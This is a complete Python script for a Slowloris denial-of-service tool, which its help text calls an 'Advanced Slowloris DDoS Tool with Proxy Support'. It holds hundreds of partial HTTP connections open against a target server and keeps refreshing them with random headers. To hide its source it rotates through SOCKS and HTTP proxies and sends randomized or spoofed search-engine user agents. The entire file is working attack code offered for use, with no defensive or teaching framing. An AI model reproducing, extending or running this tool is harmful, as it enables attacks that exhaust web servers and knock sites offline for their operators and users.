import os
import sys
import socket
import ssl
import time
import random
import threading
import logging
import argparse

# Colored output support
try:
    from colorama import Fore, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    # Fallback if colorama is not installed – colours will be disabled
    class _Dummy:
        def __getattr__(self, _):
            return ""
    Fore = Style = _Dummy()
import base64
from itertools import cycle
from urllib.parse import urlparse

# ASCII Banner
SLOWLORIS_BANNER = """
   _____ _               _                _     
  / ____| |             | |              (_)    
 | (___ | | _____      _| |     ___  _ __ _ ___ 
  \\___ \\| |/ _ \\ \\ /\\ / / |    / _ \\| '__| / __|
  ____) | | (_) \\ V  V /| |___| (_) | |  | \\__ \\
 |_____/|_|\\___/ \\_/\\_/ |______\\___/|_|  |_|___/
                                                    
"""

try:
    import socks
except ImportError:
    print("PySocks library is required. Install with: pip install pysocks")
    sys.exit(1)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)-8s | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger("slowloris_pro")

class ColorFormatter(logging.Formatter):
    """Logging formatter adding ANSI colours based on level."""
    COLORS = {
        logging.DEBUG: Fore.CYAN,
        logging.INFO: Fore.GREEN,
        logging.WARNING: Fore.YELLOW,
        logging.ERROR: Fore.RED,
        logging.CRITICAL: Fore.MAGENTA,
    }

    def format(self, record):
        color = self.COLORS.get(record.levelno, "")
        record.levelname = f"{color}{record.levelname}{Style.RESET_ALL}"
        record.msg = f"{color}{record.getMessage()}{Style.RESET_ALL}"
        # Use parent to handle time etc.
        return super().format(record)

class Slowloris:
    def __init__(self, target, port=80, sockets_count=500, 
                 proxies=None, ssl_enabled=False, timeout=10, 
                 max_retries=3, keepalive_interval=15, max_threads=50, 
                 sleep_time_range=(0.1, 0.5), duration=60):
        self.target = target
        self.port = port
        self.sockets_count = sockets_count
        self.proxies = proxies or []
        self.ssl_enabled = ssl_enabled
        self.timeout = timeout
        self.max_retries = max_retries
        self.keepalive_interval = keepalive_interval
        self.max_threads = max_threads
        self.sleep_time_range = sleep_time_range
        self.duration = duration
        self.is_running = False
        self.sockets = []
        self.lock = threading.Lock()
        self.stats = {
            'sockets_created': 0,
            'sockets_failed': 0,
            'socks4_proxies': 0,
            'socks5_proxies': 0,
            'http_proxies': 0,
            'https_proxies': 0,
            'sockets_active': 0,
            'keepalives_sent': 0,
            'errors': 0
        }
        
        self.target_host, self.target_port = self.parse_target(target, port)
        self.user_agents = self.get_user_agents()
    
    @staticmethod
    def parse_target(target, port):
        if target.startswith(('http://', 'https://')):
            parsed = urlparse(target)
            host = parsed.hostname
            if parsed.port:
                port = parsed.port
            elif parsed.scheme == 'https':
                port = 443
            else:
                port = port or 80
            return host, port
        return target, port or 80
    
    def get_user_agents(self):
        return [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/121.0 Mobile/15E148 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.91",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
            "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-X710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
        ]
    
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def create_socket_through_proxy(self, proxy):
        try:
            proxy_type = proxy['type']
            proxy_host = proxy['host']
            proxy_port = proxy['port']
            username = proxy['username']
            password = proxy['password']
            
            # Update stats
            with self.lock:
                if proxy_type == 'socks4':
                    self.stats['socks4_proxies'] += 1
                elif proxy_type == 'socks5':
                    self.stats['socks5_proxies'] += 1
                elif proxy_type == 'http':
                    self.stats['http_proxies'] += 1
                elif proxy_type == 'https':
                    self.stats['https_proxies'] += 1
            
            # Resolve proxy address
            addr_info = socket.getaddrinfo(proxy_host, proxy_port, 
                                        socket.AF_UNSPEC, socket.SOCK_STREAM)
            family = addr_info[0][0]
            
            # Create socket based on proxy type
            if proxy_type == 'https':
                # Create base socket
                s = socket.socket(family=family)
                s.settimeout(self.timeout)
                
                # Wrap with SSL for HTTPS proxy
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                ssl_sock = context.wrap_socket(s, server_hostname=proxy_host)
                ssl_sock.connect((proxy_host, proxy_port))
                
                # Send CONNECT request
                connect_to = f"{self.target_host}:{self.target_port}"
                connect_request = f"CONNECT {connect_to} HTTP/1.1\r\nHost: {connect_to}\r\n"
                
                if username and password:
                    auth_str = base64.b64encode(f"{username}:{password}".encode()).decode()
                    connect_request += f"Proxy-Authorization: Basic {auth_str}\r\n"
                
                connect_request += "\r\n"
                ssl_sock.send(connect_request.encode())
                
                # Read response
                response = b''
                while b'\r\n\r\n' not in response:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                
                if b'200' not in response:
                    raise Exception(f"HTTPS proxy CONNECT failed: {response[:100]}")
                
                # Apply SSL if needed
                if self.ssl_enabled:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    ssl_sock = context.wrap_socket(
                        ssl_sock, server_hostname=self.target_host)
                
                return ssl_sock
            else:
                s = socks.socksocket(family=family)
                s.settimeout(self.timeout)
                
                if proxy_type == 'http':
                    s.set_proxy(socks.HTTP, proxy_host, proxy_port, 
                             username=username, password=password)
                elif proxy_type == 'socks4':
                    s.set_proxy(socks.SOCKS4, proxy_host, proxy_port, 
                             username=username, password=password)
                elif proxy_type == 'socks5':
                    s.set_proxy(socks.SOCKS5, proxy_host, proxy_port, 
                             username=username, password=password)
                
                s.connect((self.target_host, self.target_port))
                
                # Apply SSL if needed
                if self.ssl_enabled:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    s = context.wrap_socket(s, server_hostname=self.target_host)
                
                return s
        
        except Exception as e:
            logger.debug(f"Proxy connection failed: {e}")
            return None
    
    def create_direct_socket(self):
        try:
            # Resolve address with both IPv4 and IPv6
            addr_info = socket.getaddrinfo(self.target_host, self.target_port, 
                                        socket.AF_UNSPEC, socket.SOCK_STREAM)
            family, socktype, proto, canonname, sockaddr = addr_info[0]
            
            s = socket.socket(family, socktype, proto)
            s.settimeout(self.timeout)
            s.connect(sockaddr)
            
            if self.ssl_enabled:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=self.target_host)
            
            return s
        except Exception as e:
            logger.debug(f"Direct connection failed: {e}")
            return None
    
    def create_socket(self, proxy=None):
        for attempt in range(self.max_retries):
            try:
                if proxy:
                    logger.debug(f"Creating socket via {proxy['type']}://{proxy['host']}:{proxy['port']}")
                    s = self.create_socket_through_proxy(proxy)
                else:
                    logger.debug("Creating direct socket")
                    s = self.create_direct_socket()
                
                if s:
                    # Send initial HTTP request
                    request = (
                        f"GET /?{random.randint(0, 10000)} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"User-Agent: {self.get_random_user_agent()}\r\n"
                        "Accept: */*\r\n"
                        "Connection: keep-alive\r\n"
                        "\r\n"
                    ).encode()
                    
                    s.send(request)
                    
                    with self.lock:
                        self.stats['sockets_created'] += 1
                        self.stats['sockets_active'] += 1
                    return s
            except Exception as e:
                logger.debug(f"Socket creation attempt {attempt+1} failed: {e}")
                time.sleep(0.5)  # Brief pause between retries
        
        with self.lock:
            self.stats['sockets_failed'] += 1
        return None
    
    def send_keepalive(self, sock):
        try:
            header_name = f"X-{random.randint(1000, 9999)}"
            header_value = random.randint(1, 1000000)
            header = f"{header_name}: {header_value}\r\n"
            sock.send(header.encode())
            with self.lock:
                self.stats['keepalives_sent'] += 1
            return True
        except (socket.error, OSError, ssl.SSLError) as e:
            logger.debug(f"Keepalive failed: {e}")
            with self.lock:
                self.stats['errors'] += 1
                self.stats['sockets_active'] -= 1
            return False
    
    def maintain_connection(self, sock):
        logger.debug(f"Starting connection maintenance for socket")
        last_keepalive = time.time()
        
        while self.is_running:
            try:
                # Send keepalive at appropriate intervals
                if time.time() - last_keepalive >= self.keepalive_interval:
                    if not self.send_keepalive(sock):
                        break
                    last_keepalive = time.time()
                
                # Random short sleep to reduce CPU usage
                time.sleep(random.uniform(*self.sleep_time_range))
            except Exception as e:
                logger.error(f"Connection maintenance error: {e}")
                break
    
    def start_attack(self):
        logger.info(f"Starting attack on {self.target_host}:{self.target_port}")
        logger.info(f"Duration: {self.duration} seconds")
        logger.info(f"Initializing {self.sockets_count} sockets...")
        
        # Create proxy cycle if available
        proxy_cycle = cycle(self.proxies) if self.proxies else None
        sockets_created = 0
        start_time = time.time()
        
        # Create initial sockets
        while self.is_running and sockets_created < self.sockets_count:
            if time.time() - start_time > self.duration:
                logger.info("Attack duration reached during initialization")
                self.is_running = False
                break
                
            try:
                proxy = next(proxy_cycle) if proxy_cycle else None
                sock = self.create_socket(proxy)
                if sock:
                    self.sockets.append(sock)
                    sockets_created += 1
                    threading.Thread(
                        target=self.maintain_connection,
                        args=(sock,),
                        daemon=True
                    ).start()
                
                # Throttle socket creation
                time.sleep(0.01)
            except StopIteration:
                proxy_cycle = cycle(self.proxies)  # Reset cycle
            except Exception as e:
                logger.error(f"Error during socket creation: {e}")
        
        logger.info(f"Attack running with {len(self.sockets)} active connections")
        attack_start = time.time()
        
        # Main attack loop
        while self.is_running:
            # Check duration
            if time.time() - attack_start > self.duration:
                logger.info("Attack duration reached. Stopping attack.")
                self.is_running = False
                break
            
            # Replenish lost sockets
            with self.lock:
                active_count = self.stats['sockets_active']
            
            if active_count < self.sockets_count:
                needed = self.sockets_count - active_count
                logger.info(f"Replenishing {needed} connections...")
                
                for _ in range(needed):
                    if not self.is_running or time.time() - attack_start > self.duration:
                        break
                    
                    try:
                        proxy = next(proxy_cycle) if proxy_cycle else None
                        sock = self.create_socket(proxy)
                        if sock:
                            self.sockets.append(sock)
                            threading.Thread(
                                target=self.maintain_connection,
                                args=(sock,),
                                daemon=True
                            ).start()
                    except Exception as e:
                        logger.error(f"Replenishment failed: {e}")
            
            # Print stats
            with self.lock:
                stats_msg = (
                    f"Active: {self.stats['sockets_active']}/{self.sockets_count} | "
                    f"Created: {self.stats['sockets_created']} | "
                    f"Keepalives: {self.stats['keepalives_sent']} | "
                    f"Errors: {self.stats['errors']}"
                )
                if self.proxies:
                    stats_msg += (
                        f"\nProxy Types: SOCKS4({self.stats['socks4_proxies']}) | "
                        f"SOCKS5({self.stats['socks5_proxies']}) | "
                        f"HTTP({self.stats['http_proxies']}) | "
                        f"HTTPS({self.stats['https_proxies']})"
                    )
                logger.info(stats_msg)
            
            # Wait before next replenishment check
            time.sleep(5)

    def start(self):
        if self.is_running:
            logger.warning("Attack is already running")
            return
        
        self.is_running = True
        self.attack_thread = threading.Thread(target=self.start_attack)
        self.attack_thread.daemon = True
        self.attack_thread.start()
        logger.info("Attack started")
    
    def stop(self):
        if not self.is_running:
            logger.warning("Attack is not running")
            return
        
        self.is_running = False
        logger.info("Stopping attack...")
        
        # Close all sockets
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        
        self.sockets.clear()
        
        # Wait for attack thread to finish
        if self.attack_thread.is_alive():
            self.attack_thread.join(timeout=5)
        
        logger.info("Attack stopped")
        logger.info("Final statistics:")
        for k, v in self.stats.items():
            logger.info(f"{k.replace('_', ' ').title()}: {v}")

def parse_proxy(proxy_str):
    proxy_type = 'http'
    if '://' in proxy_str:
        proxy_type, proxy_str = proxy_str.split('://', 1)
    
    username = password = None
    if '@' in proxy_str:
        auth_part, host_part = proxy_str.rsplit('@', 1)
        if ':' in auth_part:
            username, password = auth_part.split(':', 1)
        else:
            username = auth_part
    else:
        host_part = proxy_str
    
    if ':' in host_part:
        host, port_str = host_part.split(':', 1)
        try:
            port = int(port_str)
        except ValueError:
            raise ValueError(f"Invalid port number: {port_str}")
    else:
        host = host_part
        port = 1080
    
    proxy_type = proxy_type.lower()
    if proxy_type not in ['http', 'https', 'socks4', 'socks5']:
        raise ValueError(f"Unsupported proxy type: {proxy_type}")
    
    return {
        'type': proxy_type,
        'host': host,
        'port': port,
        'username': username,
        'password': password
    }

def load_proxies(file_path):
    proxies = []
    if not os.path.exists(file_path):
        logger.error(f"Proxy file not found: {file_path}")
        return proxies
    
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                try:
                    proxy = parse_proxy(line)
                    proxies.append(proxy)
                except Exception as e:
                    logger.error(f"Invalid proxy '{line}': {e}")
        
        logger.info(f"Loaded {len(proxies)} proxies from {file_path}")
        return proxies
    except Exception as e:
        logger.error(f"Failed to load proxy file: {e}")
        return []

def main():
    print(SLOWLORIS_BANNER)
    
    parser = argparse.ArgumentParser(
        description="Advanced Slowloris DDoS Tool with Proxy Support",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("target", help="Target URL or IP address")
    parser.add_argument("-p", "--port", type=int, default=80, 
                       help="Target port")
    parser.add_argument("-s", "--sockets", type=int, default=500, 
                       help="Number of sockets to use")
    parser.add_argument("--proxy-file", metavar="PROXY_FILE", 
                       help="Path to proxy file (one proxy per line)")
    parser.add_argument("--ssl", action="store_true", 
                       help="Enable SSL/TLS encryption for target")
    parser.add_argument("--timeout", type=int, default=10, 
                       help="Socket connection timeout in seconds")
    parser.add_argument("--keepalive", type=int, default=15, 
                       help="Seconds between keep-alive header batches")
    parser.add_argument("--threads", type=int, default=50, 
                       help="Max threads for socket management")
    parser.add_argument("--sleep-min", type=float, default=0.1,
                       help="Minimum sleep time between keep-alive headers (seconds)")
    parser.add_argument("--sleep-max", type=float, default=0.5,
                       help="Maximum sleep time between keep-alive headers (seconds)")
    parser.add_argument("--debug", action="store_true", 
                       help="Enable debug logging")
    parser.add_argument("--duration", type=int, default=60,
                       help="Duration of the attack in seconds")
    
    args = parser.parse_args()
    
    # Input validation
    if args.sleep_min < 0 or args.sleep_max < 0:
        logger.error("Sleep times must be positive values")
        sys.exit(1)
    if args.sleep_min > args.sleep_max:
        logger.error("Minimum sleep time cannot be greater than maximum")
        sys.exit(1)
    if args.duration < 1:
        logger.error("Duration must be at least 1 second")
        sys.exit(1)
    
    # Configure logging with colour support
    level = logging.DEBUG if args.debug else logging.INFO
    handler = logging.StreamHandler()
    handler.setFormatter(ColorFormatter('%(asctime)s | %(levelname)-8s | %(message)s'))
    root_logger = logging.getLogger()
    root_logger.setLevel(level)
    root_logger.handlers.clear()
    root_logger.addHandler(handler)
    
    # Load proxies
    proxies = []
    if args.proxy_file:
        proxies = load_proxies(args.proxy_file)
    
    # Initialize attack
    slowloris = Slowloris(
        target=args.target,
        port=args.port,
        sockets_count=args.sockets,
        proxies=proxies,
        ssl_enabled=args.ssl,
        timeout=args.timeout,
        keepalive_interval=args.keepalive,
        max_threads=args.threads,
        sleep_time_range=(args.sleep_min, args.sleep_max),
        duration=args.duration
    )
    
    try:
        slowloris.start()
        
        # Wait for attack to complete or keyboard interrupt
        while slowloris.attack_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Keyboard interrupt received. Stopping attack...")
        slowloris.stop()
    except Exception as e:
        logger.error(f"Critical error: {e}")
        slowloris.stop()
        sys.exit(1)
    finally:
        if slowloris.is_running:
            slowloris.stop()

if __name__ == "__main__":
    main()